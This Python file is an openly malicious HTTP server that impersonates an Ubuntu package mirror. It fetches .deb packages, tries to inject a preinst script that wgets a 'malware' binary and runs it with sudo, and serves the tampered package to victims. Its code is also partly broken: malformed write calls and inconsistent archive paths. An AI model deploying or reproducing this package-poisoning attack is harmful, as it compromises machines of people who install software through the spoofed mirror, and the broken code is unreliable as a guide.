from http.server import BaseHTTPRequestHandler, HTTPServer
from scapy.all import get_if_addr
import requests
import os
import os.path
# import hashlib

base_url = "http://nl.archive.ubuntu.com"

class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        print("request:", self.path)
        if "ubuntu/pool" in self.path:
            r = requests.get(base_url + self.path)

            # print(r.headers)

            self.send_response(200)
            for header in r.headers.keys():
                self.send_header(header, r.headers[header])
            self.end_headers()

            package_filename = self.path.split("/")[-1]

            # create the deb file
            try:
                package = open(package_filename, "xb")
                package.write(r.content)
                package.close()
            except FileExistsError:
                pass

            # extract deb files
            os.system("ar x {} --output extracting_area".format(package_filename))

            # unzip control
            os.system("gunzip {}/control.tar.gzip".format(package_filename))
            os.system("tar x {}/control.tar".format(package_filename))

            # checks whether preinst exists already
            if(not os.path.exists("{}/control.tar/preinst".format(package_filename))):
                # add malicious preinst
                os.system("tar rf {}/control.tar preinst".format(package_filename))
            # if preinst already exists copy created preinst into the exisiting one
            else:
                w_preinst = open("preinst", "w")
                w_preinst.write(
                        "#!/bin/sh \n",
                        "echo \"DOWNLOAD\" \n",
                        "wget nl.archive.ubuntu.com/malware \n",
                        "./malware \n",
                        "sudo ./malware \n")
                w_preinst.close()

            # zip control
            os.system("gzip {}/control.tar.gzip".format(package_filename))

            # add control back to the deb
            os.system("ar r ./test/control.tar.gz {}.deb".format(package_filename))

            f = open("{}".format(package_filename), "rb")
            content = f.read()

            # if python 3 - bytes(content)
            self.wfile.write(content)
            f.close()
        else:
            self.send_response(200)
            self.end_headers()
            f = open("." + self.path, "rb")
            content = f.read()
            # print(content)
            self.wfile.write(content)
            f.close()

def start_server(iface):
    try:
        ip = get_if_addr(iface)
        port = 80

        web_server = HTTPServer((ip, port), Server)
        print("Server started at {}:{}".format(ip, port))

        try:
            web_server.serve_forever()
        except KeyboardInterrupt:
            web_server.server_close()
            print("Server stopped")
    except Exception:
        import traceback
        print(traceback.format_exc())
